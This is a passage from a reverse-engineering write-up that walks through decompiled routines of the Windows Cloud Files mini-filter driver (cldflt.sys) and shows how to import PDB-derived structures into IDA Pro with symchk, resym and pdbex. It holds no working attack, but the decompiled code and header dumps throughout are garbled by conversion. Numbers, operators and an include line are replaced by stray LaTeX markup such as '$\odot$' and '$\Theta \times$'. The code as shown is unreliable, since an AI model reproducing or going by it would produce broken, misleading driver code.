Of course, it is not the main subject in discussion here, but there is a series of relationship between each one of the structures. For example, readers can find references to \_WNF\_SCOPE\_INSTANCE in other WNF structures such as \_WNF\_DATA\_SCOPE, \_WNF\_LOCK, _WNF\_NODE\_HEADER_ and \_WNF\_PERMANENT\_DATA\_STORE.

Returning to the mini-filter driver subject, ExSubscribeWnfStateChange is called to perform a new subscription in the WNF mechanism. As this framework is associated with notification, so a callback (HsmiOOBECompleteWnfCallback) is provided with the registration and that will be triggered when the Windows Welcome (in this case, setup of cloud synchronization services) has finished (WNF\_DEP\_OOBE\_COMPLETE).

The referred callback (HsmiOOBECompleteWnfCallback) that is being used as argument for the ExSubscribeWnfStateChange function invokes HsmOsCheckIfSetupInProgress routine, which uses ExQueryWnfStateData function that reads data stored WNF\_NAME\_INSTANCE structure and copies it into a buffer.

[https://exploitreversing.com](https://exploitreversing.com/)

The HsmiOOBECompleteWnfCallback callback routine, with the appropriate types and renamed variables already applied, is shown below:

\_\_int64 \_\_fastcall HsmiOOBECompleteWnfCallback( \_\_int64 Subscription, \_\_int64 a2, \_\_int64 a3, \_\_int64 a4, int a5, \_\_int64 a6)

{ // \[COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD "+" TO EXPAND\]

VolumeListSize $= ~ \\odot \\lfloor ~ \\lfloor ~ $ ; returned\_status $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; NumberVolumesReturned\[0\] $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; Volume $=$ 0LL; BufferStatus $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; if ( a6 ) { returned\_status $=$ HsmOsCheckIfSetupInProgress(Subscription, &BufferStatus, 0LL) HsmDbgBreakOnStatus(returned\_status); if ( returned\_status $> =$ 0 && !BufferStatus ) { ::BufferStatus $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; for ( counter $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ ; counter < 3; $^ { + + }$ counter ) { if ( Volume ) ExFreePoolWithTag(Volume, 'lVsH'); VolumeListSize $=$ (unsigned int)(VolumeListSize $^ +$ 2); Allocated\_Pool $=$ (PFLT\_VOLUME $\\star$ )ExAllocatePool2( POOL\_PAGED, 8LL $\\star$ (unsigned int)VolumeListSize, 'lVsH'); Volume $=$ Allocated\_Pool; if ( !Allocated\_Pool ) return (unsigned int)STATUS\_INSUFFICIENT\_RESOURCES; returned\_status $=$ FltEnumerateVolumes( Filter, Allocated\_Pool, VolumeListSize, (PULONG)NumberVolumesReturned); HsmDbgBreakOnStatus(returned\_status); if ( returned\_status $> =$ 0 && NumberVolumesReturned\[0\] $\\angle$ (unsigned int)VolumeListSize ) { VolumeListSize $=$ (unsigned int)NumberVolumesReturned\[0\]; break; } if ( returned\_status ! $=$ (unsigned int)STATUS\_BUFFER\_TOO\_SMALL ) goto LABEL\_18; VolumeListSize $=$ (unsigned int)NumberVolumesReturned\[0\]; } $\\mathsf { F l a g } ~ = ~ 1$ ; Pool\_1 $=$ Volume;

if ( (\_DWORD)VolumeListSize ) { counter\_size $=$ (unsigned int)VolumeListSize; do { FltAttachVolumeAtAltitude(Filter, \*Volume++, &Altitude, &InstanceName, 0LL); --counter\_size; } while ( counter\_size ); } Flag = 0; Volume $=$ Pool\_1; if ( Pool\_1 ) { LABEL\_18: if ( (\_DWORD)VolumeListSize ) { ptr\_Pool $=$ (PVOID $\\star$ )Volume; do { FltObjectDereference(\*ptr\_Pool++); --VolumeListSize; } while ( VolumeListSize ); } ExFreePoolWithTag(Volume, 'lVsH'); } } } return (unsigned int)returned\_status; }

In this code above, we see the already mentioned HsmOsCheckIfSetupInProgress routine being called. In general, HsmOsCheckIfSetupInProgress routine checks whether the subscription process is finished. The interesting part is that WNF data is stored and represented in the memory through WNF\_STATE\_DATA structure, which is one an important data structure also used during exploitation (more information about it later), and whose composition is AllocatedSize, DataSize and ChangeStamp (provides the number of times that the structure has been updated), as shown below:

![](https://exploitreversing.com/wp-content/uploads/2026/02/images/67dc07b830d921c449f3c47a510c392319adc024c048f15b08b965694865792a.jpg)

\[Figure 37\]: HsmiOOBECompleteWnfCallback routine

\[Figure 38\]: \_WNF\_STATE\_DATA structure

Afterwards, there is a call for ExAllocatePool2 to allocate up to three paged pools (tag is HsVl), an invocation of FltEnumerateVolumes function to list all system volumes and the FltAttachVolumeAtAltitude function is called, which creates the mini-filter driver instance and attaches it to each volume at the specified altitude.

Once we have finished this brief explanation on the WNF, returning to the HsmDriverEntry routine (the main routine), we find the HsmFileCacheInitialize routine, whose content follows below:

\_int64 \_\_fastcall HsmFileCacheInitialize(PDRIVER\_OBJECT DriverObject) { // \[COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD "+" TO EXPAND\] DeviceObject $=$ 0LL; if... memset64(DriverObject->MajorFunction, (unsigned \_int64)HsmiFileCacheIrpNotImplemented, 0x1CuLL); DriverObject->FastIoDispatch $\\llcorner$ 0LL; DriverObject->MajorFunction\[IRP\_MJ\_READ\] $=$ (PDRIVER\_DISPATCH)HsmiFileCacheIrpRead; DriverObject->MajorFunction\[IRP\_MJ\_WRITE\] $=$ (PDRIVER\_DISPATCH)HsmiFileCacheIrpWrite; DriverObject->MajorFunction\[IRP\_MJ\_QUERY\_INFORMATION\] $=$ (PDRIVER\_DISPATCH)HsmiFileCacheIrpQueryInformation; DriverObject->MajorFunction\[IRP\_MJ\_CLOSE\] $=$ (PDRIVER\_DISPATCH)HsmiFileCacheIrpClose; status\_IoCreateDevice $=$ IoCreateDevice( DriverObject, 0, 0LL, FILE\_DEVICE\_DISK\_FILE\_SYSTEM, FILE\_DEVICE\_SECURE\_OPEN, 0, &DeviceObject); HsmDbgBreakOnStatus(status\_IoCreateDevice); if ( status\_IoCreateDevice $\\mathrm { \\Sigma } > = \\mathrm { \\Sigma } \\left( \\cdot \\right)$ ) { p\_DeviceObject $=$ 0LL; ::DeviceObject $=$ DeviceObject; DeviceObject $=$ 0LL; } else { if... p\_DeviceObject $=$ DeviceObject; } if... if... return (unsigned int)status\_IoCreateDevice; }

This is one of routines that we will review and analyze later because it provides us with a few dispatch functions (callbacks) that effectively take some actions in the mini-filter driver. Though, before proceeding, we need to finish our overview for the HsmDriverEntry routine.

I have applied the \_FLT\_REGISTRATION structure to the Registration reference and, in fact, the stack has been messed up, but it is not problem for while, and even so it provides readers with an idea as the structure is being assigned field by field. As we learned previously, the mini-filter driver registers itself in

[https://exploitreversing.com](https://exploitreversing.com/)

the Filter Manager through the invocation of FltRegisterFilter function and using the FLT\_REGISTRATION structure, which will define the necessary callbacks to manage requests.

Later, the FltStartFiltering will notify that the referred mini-filter driver is available to attach to volumes (callbacks are invoked for each volume) and accept requests. In this case, readers can check all registered filters by executing fltmc command, and details on a respective instance can be retrieved by executing fltmc instances -f cldflt command.

The registration, as also commented, uses the FLT\_REGISTRATION structure, whose most relevant field is OperationRegistration that refers to a list of FLT\_OPERATION\_REGISTRATION structures, each one associated with an I/O type and respective pre-operation and post-operation callback routines.

In terms of reverse engineering, if we change the type of g\_HsmFltCallbacks to const FLT\_OPERATION\_REGISTRATION and follow it, you are going to find an array, which represents a sequence of preoperation and postoperation callbacks that are registered to FltRegisterFilter function in the HsmDriverEntry routine.

However, the original representation is not particularly good, and we can change it to a better one if you realize the array has 15 elements whose type is FLT\_OPERATION\_REGISTRATION then creating an array (right click Array) and setting the Array size to 15, we have:

.rdata:00000001C001E000 ; const FLT\_OPERATION\_REGISTRATION g\_HsmFltCallbacks

.rdata:00000001C001E000 g\_HsmFltCallbacks FLT\_OPERATION\_REGISTRATION <0FFh, 0, \

.rdata:00000001C001E000 ; DATA XREF: HsmDriverEntry+35F↓o

.rdata:00000001C001E000 offset HsmFltPreACQUIRE\_FOR\_SECTION\_SYNCHRONIZATION,\

.rdata:00000001C001E000 offset HsmFltPostACQUIRE\_FOR\_SECTION\_SYNCHRONIZATION,\

.rdata:00000001C001E000 $\ b 0 >$

.rdata:00000001C001E020 FLT\_OPERATION\_REGISTRATION $<$ 12h, 0, offset HsmFltPreCLEANUP,\

.rdata:00000001C001E020 offset HsmFltPostCLEANUP, $\ b 0 >$

.rdata:00000001C001E040 FLT\_OPERATION\_REGISTRATION $<$ 0, 0, offset HsmFltPreCREATE, \

.rdata:00000001C001E040 offset HsmFltPostNETWORK\_QUERY\_OPEN, $\ b 0 >$

.rdata:00000001C001E060 FLT\_OPERATION\_REGISTRATION $< 0 { \\mathsf { C h } }$ , 0, \

.rdata:00000001C001E060 offset HsmFltPreDIRECTORY\_CONTROL, \

.rdata:00000001C001E060 offset HsmFltPostDIRECTORY\_CONTROL, 0>

.rdata:00000001C001E080 FLT\_OPERATION\_REGISTRATION <0F3h, 0, \

.rdata:00000001C001E080 offset HsmFltPrePREPARE\_MDL\_WRITE, 0, 0>

.rdata:00000001C001E0A0 FLT\_OPERATION\_REGISTRATION < 0Dh, 0, \

.rdata:00000001C001E0A0 offset HsmFltPreFILE\_SYSTEM\_CONTROL, \

.rdata:00000001C001E0A0 offset HsmFltPostFILE\_SYSTEM\_CONTROL, 0>

.rdata:00000001C001E0C0 FLT\_OPERATION\_REGISTRATION < 11h, 0, \

.rdata:00000001C001E0C0 offset HsmFltPreLOCK\_CONTROL, \

.rdata:00000001C001E0C0 offset HsmFltPostLOCK\_CONTROL, 0>

.rdata:00000001C001E0E0 FLT\_OPERATION\_REGISTRATION <0F1h, 0, \

.rdata:00000001C001E0E0 offset HsmFltPreMDL\_READ, 0, 0>

.rdata:00000001C001E100 FLT\_OPERATION\_REGISTRATION <0F2h, 0, \

.rdata:00000001C001E100 offset HsmFltPreNETWORK\_QUERY\_OPEN, \

.rdata:00000001C001E100 offset HsmFltPostNETWORK\_QUERY\_OPEN, 0>

.rdata:00000001C001E120 FLT\_OPERATION\_REGISTRATION <0EFh, 0,

.rdata:00000001C001E120 offset HsmFltPrePREPARE\_MDL\_WRITE, 0, 0>

.rdata:00000001C001E140 FLT\_OPERATION\_REGISTRATION $<$ 3, 0, offset HsmFltPreREAD, \

.rdata:00000001C001E140 offset HsmFltPostACQUIRE\_FOR\_SECTION\_SYNCHRONIZATION,\

.rdata:00000001C001E140 0>

.rdata:00000001C001E160 FLT\_OPERATION\_REGISTRATION < 6, 0, \

.rdata:00000001C001E160 offset HsmFltPreSET\_INFORMATION, \

![](https://exploitreversing.com/wp-content/uploads/2026/02/images/a6df8604b52c212e322f9086402f7bdc8dd9e28dcca9e496fe75e889a00b711a.jpg)

\[Figure 40\]: Array of preoperation and postoperation callbacks

Of course, we could improve it, but it is enough to learn what callback routines are involved with this minifilter driver, and later it can be useful.

The HsmpCheckUpperInstanceRegNeeded routine does not anything much different from instructions already explained previously and only is concerned whether the Registry entry path is represented in uppercase or not.

The HsmpOpenInstancesRegistryKey routine opens the

HKEY\_LOCAL\_MACHINE\\System\\CurrentControlSet\\Services\\Cldflt\\Instances Registry key entry. In a couple of opportunities that depends on the conditions, the mini-filter drive is registered in the Filter Manager by calling FltRegisterFilter function.

If the registration is successful (it could be also STATUS\_INSUFFICIENT, STATUS\_INVALID\_PARAMETER, STATUS\_FLT\_NOT\_INITIALIZED or STATUS\_OBJECT\_NAME\_NOT\_FOUND), different lookaside lists are initialized by invoking ExInitializePagedLookasideList routine with unique pool tags such as HsSe, HsRc and HsOr (curiously, the POOL\_NX\_ALLOCATION flag is specified, but since Windows 8 all paged memory allocations are already done using this flag).

The allocated paged pool lookaside lists are initialized for the allocation of ECPs (Extra Create Parameter) context structures, which usually contain additional information for operations like IRP\_MJ\_CREATE on a file or when a driver calls FltCreateFileEx2 function.

Finally, FltStartFiltering function is called and starts filtering for the registered minifilter driver. At this point, we have a brief understanding of the first main routine (HsmDriverEntry) of the mini-filter driver and can proceed with analysis of further and more interesting routines, which a few of them come from this main routine, but requires a separated analysis.

It is time to pay attention to the code of HsmFileCacheInitialize routine (Figure 39), which is the core routine of this mini-filter driver, holds a reference to dispatch table with the array of pointer to dispatch routines, and that's the starting point from which every action is initially directed.

This mini-filter driver does not make use of Fast I/O, and in terms of dispatch table, for now we see four dispatch routines:

Read: HsmiFileCacheIrpRead ▪ Write: HsmiFileCacheIrpWrite Query Information: HsmiFileCacheIrpQueryInformation Close: HsmiFileCacheIrpClose

All remaining dispatch slots are filled with HsmiFileCacheIrpNotImplemented routine. The device object is created by invoking IoCreateDevice function, and there is not anything new to comment about its arguments, which follow the standard procedure.

Another relevant function that can be analyzed is HsmFltInstanceSetup, at line 103, which is associated with the registration process. The InstanceSetupCallback is an optional field from \_FLT\_REGISTRATION structure, which specify a callback is used by the FltMgr to notify the minifilter about an available volume after it has been mounted. Furthermore, the callback is called after HsmFileCacheInitialize routine that is going to be one among others focus of analysis. Anyway, I am making brief comments about its content and save future time to explain an additional topic.

The HsmFltInstanceSetup routine wraps HsmpCtxCreateInstanceContext routine, but I did not show the entire code because it is quite long and, as this routine is not really critical for our upcoming sections, I have opted for highlighting only a few points and also show a few pieces of them. Obviously, the code has already been reversed, commented, with types applied, function and variable renamed:

There is a wcscpy(MetaReparsePoint, L"\\$Extend\\$Reparse:$R:$INDEX\_ALLOCATION") instruction, which is a path that refers to metadata used for managing reparse points. This stream is used for storing information about all reparse points on the volume, which is an indication that our routine (HsmpCtxCreateInstanceContext) will manage with volumes and, in special, with NTFS volumes because there is an instruction evaluating it ( if ( VolumeFilesystemType != FLT\_FSTYPE\_NTFS) ):

Instance $=$ FltInstance->Base.PrimaryLink.Instance;

wcscpy((wchar\_t $\\star$ )MetaReparsePoint, L"\\$Extend\\$Reparse:$R:$INDEX\_ALLOCATION");

\*(\_DWORD $\\star$ )&GuidString.Length $=$ Flags;

VolGuidName $=$ 0LL;

▪ Information about the minifilter driver instance is retrieved by calling FltGetInstanceInformation function.

LABEL\_17: BufferSize $= ~ \\odot \\times \\mathsf C$ ; for ( OutBuffer $=$ (\_INSTANCE\_PARTIAL\_INFORMATION $\\star$ )&Buffer; ; OutBuffer $=$

Pool2 ) { InstanceInformation $=$ FltGetInstanceInformation( Instance, InstancePartialInformation, OutBuffer, BufferSize, &LengthReturned); HsmDbgBreakOnStatus(InstanceInformation); if ( InstanceInformation ! $=$ (unsigned int)STATUS\_BUFFER\_TOO\_SMALL ) break;

▪ A context structure (FLT\_INSTANCE\_CONTEXT) is allocated to an instance context by invoking FltAllocateContext. The value 0x200 means NonPagedPool.

status\_01 $=$ FltAllocateContext( Filter, 2u, 0x1A0uLL, (POOL\_TYPE) $\\Theta \\times 2 \\Theta ( \\cdot )$ , (PFLT\_CONTEXT $\\star$ )&ReturnedContext);

The returned context is used to initialize a generic table using AVL trees by calling RtlInitializeGenericTableAvl function. In general terms, an AVL tree is a self-balancing binary search tree, whose operations like insertion, deletion and lookup suffer only a minor increase in time even the number of nodes in the tree increases a lot. Therefore, and in this case, the table is used to store data associated with the filesystem, which apparently might be the reparsing points and, as is an AVL, does not matter the number of entries, operation’s time will not go up significantly.

LABEL\_38: $\\begin{array} { r l } { \\phantom { - } \\vee 2 \\Theta } & { { } = } \\end{array}$ Instance; goto LABEL\_39; } memset(ReturnedContext, 0, $\\Theta \\times$ 1A0uLL); ReturnedContext->dword0 $=$ '2IsH'; ExInitializeResourceLite(&ReturnedContext->Resource\_02); RtlInitializeGenericTableAvl( (PRTL\_AVL\_TABLE)&ReturnedContext->avltable\_01, HsmiCbdTableCompare, HsmiFileIdTableAllocate, HsmiFileIdTableFree, 0LL); RtlInitializeGenericTableAvl( (PRTL\_AVL\_TABLE)&ReturnedContext->avl\_table\_02, HsmiFileIdTableCompare, HsmiFileIdTableAllocate, HsmiFileIdTableFree, 0LL);

The context is set up with the content of the instance of the filter on volume by calling FltSetInstanceContext function. Just to clear the concepts involved, a filter instance represents the association of a mini-filter driver (cldflt.sys) to a volume (in this case, a NTFS volume) and, as each instance contains its configuration then this configuration (anything like resources and counters) is stored into a context.

# status\_01 $=$ FltSetInstanceContext(

FltInstance->Base.PrimaryLink.Instance, FLT\_SET\_CONTEXT\_KEEP\_IF\_EXISTS,

ReturnedContext,

0LL);

▪ The volume name is retrieved through the FltGetVolume function. This volume name will be prepended to the path of reparse points discussed previously.

status\_01 $=$ FltGetVolumeName( Volume, (PUNICODE\_STRING)((unsigned \_\_int64)&VolName\_01 & - (\_\_int64)(counter\_01 != 0)), BufferSizeNeeded);

# \[Figure 46\]: HsmpCtxCreateInstanceContext routine (part 06)

Attribute information on the file system of the volume attached to the filter instance is retrieved by calling FltQueryVolumeInformation function with FsInformationClass argument defined as FileFsAttributeInformation (FILE\_FS\_ATTRIBUTE\_INFORMATION structure \| ntifs.h) .

status\_01 $=$ FltQueryVolumeInformation( Instance, &Iosb, &FsInformation, $\\Theta \\times 1 \\Theta \\cup$ , (FS\_INFORMATION\_CLASS)FileFsAttributeInformation);

The volume name is retrieved by FtlGetVolumeGuidName function, but this time in GUID format.

StatusVolGuid $=$ FltGetVolumeGuidName(

FltInstance->Base.PrimaryLink.Volume, (PUNICODE\_STRING)((unsigned \_\_int64)&VolGuidName & -(\_\_int64)(counter\_02 != 0)),

p\_p\_counter\_02);

The available size of the volume attached to the filter instance is retrieved by invoking FltQueryVolumeInformation function with FsInformationClass argument defined as FileFsSizeInformation ( \_FILE\_FS\_SIZE\_INFORMATION structure \| ntifs.h) .

▪ Through the same FltQueryVolumeInformation routine, information on the object ID and device information of the volume are returned.

▪ The volume attached to the minifilter instance is opened using FltOpenVolume function, and a handle is returned.

status\_01 $=$ FltQueryVolumeInformation( Instance, &Iosb, &FsInformation\_01, $\\Theta \\times 1 8 \\cup$ , FileFsSizeInformation);

HsmDbgBreakOnStatus(status\_01);

if ( status\_01 >= 0 )

{ StatusVolInfo $=$ FltQueryVolumeInformation( Instance, &Iosb, &FsInformation\_02, 4u,

(FS\_INFORMATION\_CLASS)(FileFsObjectIdInformation\|FileFsDeviceIn formation));

▪ A control code is sent to the filesystem driver by calling FltFsControlFile function:

( Retrieving information about the NTFS file system volume ( FSCTL\_GET\_NTFS\_VOLUME\_DATA).

o If the first FltFsControlFile function is not successful, the mini-filter driver query for an USN Journal (FSCTL\_QUERY\_USN\_JOURNAL) and, eventually, it creates an USN (update sequence number) change journal stream (FSCTL\_CREATE\_USN\_JOURNAL) on the target volume (NTFS, in this case).

o Pay attention to the pattern: as should occurs in the entire code, all operations and conditions are evaluated. Additionally, there are a series of FSCTL codes that, eventually, could not be presented on IDA Pro, but readers are able to find them in ntifs.h (check next section).

status\_01 $=$ FltFsControlFile( Instance, VolumeFileObject, FSCTL\_GET\_NTFS\_VOLUME\_DATA, 0LL, 0, OutputBuffer, $\\Theta \\times 6 \\Theta \\cup$ , 0LL);

HsmDbgBreakOnStatus(status\_01);

if ( status\_01 $\\mathrm { \\Sigma } > = \\mathrm { \\Sigma } \\left( \\cdot \\right)$ )

{

if ( (FsInformation.FileSystemAttributes & $\\Theta \\times 8 \\Theta \\Theta \\Theta \\Theta \\left( \\right) \\quad = = \\quad \\Theta \\quad ,$ )

{ StatusFS $=$ FltFsControlFile( Instance, VolumeFileObject, FSCTL\_QUERY\_USN\_JOURNAL, 0LL, 0, $\\surd 8 4$ , $\\Theta \\times 5 \\Theta \\cup$ , 0LL); HsmDbgBreakOnStatus(StatusFS); if ( StatusFS $= =$ (unsigned int)STATUS\_JOURNAL\_NOT\_ACTIVE ) { InputBuffer $=$ 0LL; StatusFS $=$ FltFsControlFile( Instance, VolumeFileObject, FSCTL\_CREATE\_USN\_JOURNAL, &InputBuffer,

$\\Theta \\times 1 \\Theta \\cup$ 0LL, 0, 0LL);

▪ Additionally, volume property information is also requested by calling FltGetVolumeProperties function.

status\_01 $=$ FltGetVolumeProperties( FltInstance->Base.PrimaryLink.Volume, &VolumeProperties, $\\Theta \\times 4 8 \\cup$ , &LengthReturned);

The mini-filter driver’s callback data queue dispatch table is initialized by invoking FltCbdqInitialize function, which allows new callback data structure items to be inserted into the queue. Actually, this call is far from simple, and there are a series of observations involved, but as we are not going through details of this routine (HsmpCtxCreateInstanceContext), I have chosen to show only an overview of each function being called and allow readers to have a big picture of the code. Finally, few lines before this invocation, readers can find push lock variables, event objects, run-down protections, and a resource variable that have been initialized.

FltInitializePushLock((PULONG\_PTR)&ReturnedContext->avltable\_01);

KeInitializeEvent( (PRKEVENT)&ReturnedContext->Event\_01, NotificationEvent, FILE\_DISPOSITION\_DELETE);

KeInitializeEvent( (PRKEVENT)&ReturnedContext->Event\_02, NotificationEvent, FILE\_DISPOSITION\_DELETE);

ExInitializeRundownProtection((PEX\_RUNDOWN\_REF)&ReturnedContext->RunDownRef);

$\\mathsf { E x }$ InitializeResourceLite((PERESOURCE)&ReturnedContext\[1\].Resource\_01);

FltCbdqInitialize( Instance, (PFLT\_CALLBACK\_DATA\_QUEUE)&ReturnedContext->CallbackDataQueue, HsmiDehydrationCsqINSERT\_IO, HsmiDehydrationCsqREMOVE\_IO, HsmiDehydrationCsqPEEK\_NEXT\_IO, CldiStreamCdqACQUIRE, CldiStreamCdqRELEASE, HsmiDehydrationCsqCOMPLETE\_CANCELED\_IO);

This is a quite succinct summary of functions and actions happening within HsmpCtxCreateInstanceContext routine. While there is nothing indispensable for our understanding right now, it judged being appropriate to explain a few points of this routine before moving for paths proposed by dispatch functions.

# 10\. Handling data types and header files

Unfortunately, not all types and structures are already present on IDA Pro, and readers will need to add such definitions several times throughout a reversing task. As readers already know, there are multiple potential sources of function types, types, enumerations, and definitions that we can use:

▪ Virgilius project: [https://www.vergiliusproject.com/](https://www.vergiliusproject.com/)

▪ Phnt: [https://github.com/winsiderss/phnt](https://github.com/winsiderss/phnt) NtDoc: [https://ntdoc.m417z.com/](https://ntdoc.m417z.com/) ReactOS: [https://github.com/reactos/reactos](https://github.com/reactos/reactos)

▪ Windows SDK: C:\\Program Files (x86)\\Windows Kits\\10\\Include<sdk version>\\km

One of the best resources for retrieving type definitions is from public PDB files (obviously, when they are available) because we can retrieve updated information, even though it can be incomplete in some cases. Thus, getting definition from a PDB or from all mentioned sources above can provide us with a starting point to follow on.

We have different options to add a new structure or enumeration that is not known by IDA Pro:

Navigate to View \| Open Subviews \| Local Types (SHIFT $+ \\mathsf { F } 1$ ). From there, press INSERT, go to the C syntax tab, and insert the structure or enumeration definition.

▪ Navigate to File \| Load File \| Parse C header file $( C ^ { \\mathsf { T R L + F 9 } } )$ .

▪ Add a custom type-library using tilib64.exe.

All options are feasible and recommended, and readers will notice that adding a user-defined structure or enumeration is a really easy task. Nonetheless, difficulties might arises when you try to add a structure defined by Microsoft, and such a structure depends on several other ones, and such structures have include directives in their dependencies. This task can be really time-consuming, and you can be dragged into an endless loop of dependencies and, eventually, give up.

The initial step is getting the PDB file and one of the direct options is through symchk from Windows SDK:

▪ (syntax) symchk.exe \[/v\] \[od\] /r FileNames /s SymbolPath

▪ (get one PDB file) symchk.exe /v /r C:\\windows\\system32\\ntdll.dll /s srv\*C:\\symbols\* [https://msdl.microsoft.com/download/symbols](https://msdl.microsoft.com/download/symbols)

▪ (get multiple PDB files) symchk.exe /v /r C:\\windows\\system32 /s srv\*C:\\symbols\* [https://msdl.microsoft.com/download/symbols](https://msdl.microsoft.com/download/symbols)

For example, let us download the PDB file associated with fltmgr.sys file:

C:>symchk.exe /v /r C:\\Windows\\system32\\drivers\\fltMgr.sys /s srv\*C:\\symbols\* [https://msdl.microsoft.com/download/symbols](https://msdl.microsoft.com/download/symbols)

\[SYMCHK\] Searching for symbols to C:\\Windows\\system32\\drivers\\fltMgr.sys in path srv\*C:\\symbols\* [https://msdl.microsoft.com/download/symbols](https://msdl.microsoft.com/download/symbols) DBGHELP: Symbol Search Path: srv\*C:\\symbols\* [https://msdl.microsoft.com/download/symbols](https://msdl.microsoft.com/download/symbols) \[SYMCHK\] Using search path "srv\*C:\\symbols\* [https://msdl.microsoft.com/download/symbols](https://msdl.microsoft.com/download/symbols)"

[https://exploitreversing.com](https://exploitreversing.com/)

PdbFilename C:\\symbols\\fltMgr.pdb\\A6BFCB011AEAD2473B9CDAD8AF19A5151\\fltMgr.pdb

PdbSignature {A6BFCB01-1AEA-D247-3B9C-DAD8AF19A515}

PdbDbiAge 0x00000001

\[SYMCHK\] \[ 0x00000000 - 0x00130001 \] Checked "C:\\Windows\\system32\\drivers\\fltMgr.sys"

SYMCHK: FAILED files $\\mathbf { \\Omega } = \\mathbf { \\Omega } \\Theta$

SYMCHK: PASSED $^ +$ IGNORED files $\ c = \ 1$

Once the PDB is retrieved, we are able to use it for extracting structure and type definitions, and tools can help to accomplish this task. One of available tools is resym, which can be installed as shown below:

▪ cargo install --git [https://github.com/ergrelet/resym](https://github.com/ergrelet/resym) resym --tag v0.3.0

Open the resym tool and pickup any of downloaded PDB files:

![](https://exploitreversing.com/wp-content/uploads/2026/02/images/f50691ac6603398db7e39eeb19ede6839e8f8bc487e6ca9cc05883c89667b7df.jpg)

\[Figure 53\]: Using symchk tool

\[Figure 54\]: Resym tool: retrieves structure and type information

As an example, during the reversing of HsmpCtxCreateInstanceContext routine shown previously, I needed to import the \_FLT\_INSTANCE structure, which comes from fltmgr.sys driver. Using resym is appropriate to this situation, and the following considerations follow:

Resym already includes all necessary dependencies such as structures and type definitions to import the chosen structure. ▪ The resource for discovering cross-references to/from is really useful in many opportunities.

# [https://exploitreversing.com](https://exploitreversing.com/)

▪ Not all includes are necessary. Actually, the first one is enough in most of situations.

▪ In rare opportunities, you might need to reorder structure definitions in the generated header file.

Another tool that I really recommend is pdbex, which can be downloaded from [https://github.com/wbenny/pdbex](https://github.com/wbenny/pdbex). As it is a Visual Studio solution, readers can compile it easily without facing any issue. The tool offers comprehensive help and many options to extract necessary structures, but the most used is the following one:

C:> C:\\Users\\Administrator\\Desktop\\RESEARCH\_PERMANENT\\GITHUB\\pdbex\_binaries\\pdbex.exe \_FLT\_INSTANCE C:\\Symbols\\fltMgr.pdb\\D38DBC770213BE072EF8BE2556D7989D1\\fltMgr.pdb $>$ flt\_instance.h

${ \\mathsf { C } } : { \\mathsf { N } } >$ cat flt\_instance.h \| head -31

/\\* $\\star$ PDB file: C:\\Symbols\\fltMgr.pdb\\D38DBC770213BE072EF8BE2556D7989D1\\fltMgr.pdb $\\star$ Image architecture: AMD64 ( $\\Theta \\times 8 6 6 4$ ) $\\star$ $\\star$ Dumped by pdbex tool v0.18, by wbenny $^ { \\star / }$

#include <pshpack1.h>

typedef enum \_FLT\_OBJECT\_FLAGS

{ FLT\_OBFL\_DRAINING $= ~ 1$ , FLT\_OBFL\_ZOMBIED $= 2$ , FLT\_OBFL\_TYPE\_INSTANCE $=$ $= ( 0 \\times 1 0 0 0 0 0 0 0$ , FLT\_OBFL\_TYPE\_FILTER $=$ $\\odot \\times 2 \\odot \\odot \\odot \\odot \\odot$ , FLT\_OBFL\_TYPE\_VOLUME $=$ $\\odot \\times 4 \\odot \\odot \\odot \\odot \\odot$ ,

} FLT\_OBJECT\_FLAGS, \*PFLT\_OBJECT\_FLAGS;

typedef struct \_EX\_RUNDOWN\_REF

{ union { /\* $\\Theta \\times \\Theta \\Theta \\Theta \\Theta$ \*/ unsigned \_\_int64 Count; /\* $\\Theta \\times \\Theta \\Theta \\Theta \\Theta$ \*/ void\* Ptr; }; /\* size: $\\Theta \\times \\Theta \\Theta \\Theta \\Theta$ \*/

} EX\_RUNDOWN\_REF, $\\star$ PEX\_RUNDOWN\_REF; /\* size: $\\Theta \\times \\Theta \\Theta \\Theta \\Theta$ \*/

typedef struct \_LIST\_ENTRY

{ /\\* $\\Theta \\times \\Theta \\Theta \\Theta \\Theta$ \*/ struct \_LIST\_ENTRY $\\star$ Flink; /\* $\\Theta \\times \\Theta \\Theta \\Theta \\Theta$ \*/ struct \_LIST\_ENTRY $\\star$ Blink;

} LIST\_ENTRY, \*PLIST\_ENTRY; /\* size: $\\Theta \\times \\Theta \\odot 1 \\odot$ \*/

As an important note, in my case, to make this \_FLT\_INSTANCE structure and other ones able to be imported correctly into IDA Pro database, I needed to add #include  following after #include <pshpack1.h> line, as shown below:

/\\* $\\star$ PDB file: C:\\Symbols\\fltMgr.pdb\\D38DBC770213BE072EF8BE2556D7989D1\\fltMgr.pdb $\\star$ Image architecture: AMD64 ( $\\Theta \\times 8 6 6 4 ,$ )

$\\star$ $\\star$ Dumped by pdbex tool v0.18, by wbenny \*/

#include <pshpack1.h>

#include

typedef enum \_FLT\_OBJECT\_FLAGS

{ FLT\_OBFL\_DRAINING $= ~ 1$ , FLT\_OBFL\_ZOMBIED $= 2$ , FLT\_OBFL\_TYPE\_INSTANCE $=$ $= ( 0 \\times 1 0 0 0 0 0 0 0$ , FLT\_OBFL\_TYPE\_FILTER $=$ $\\odot \\times 2 \\odot \\odot \\odot \\odot \\odot$ , FLT\_OBFL\_TYPE\_VOLUME $=$ $\\odot \\times 4 \\odot \\odot \\odot \\odot \\odot$ ,

} FLT\_OBJECT\_FLAGS, \*PFLT\_OBJECT\_FLAGS;

Before parsing the resulting C header file into IDA Pro, we have to adjust a few compiler options (Options Compiler menu), and it is expected that readers already have the clang compiler tools installed.

![](https://exploitreversing.com/wp-content/uploads/2026/02/images/2795d4e183481c4c535bdbdd7d1ea1a1e9342ecccd35feb82cde561851b64281.jpg)

\[Figure 56\]: flt\_instance.h file

\[Figure 57\]: Compiler options

About the configurations shown above, a few comments follow:

